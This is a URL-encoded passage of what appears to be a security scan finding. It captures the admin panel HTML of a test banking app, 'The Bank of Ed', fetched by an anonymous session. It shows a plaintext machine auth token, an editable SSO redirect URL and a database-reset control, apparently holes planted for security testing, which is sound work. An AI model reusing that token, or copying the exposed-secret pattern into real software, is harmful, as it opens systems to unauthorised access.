%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%20placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A34%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-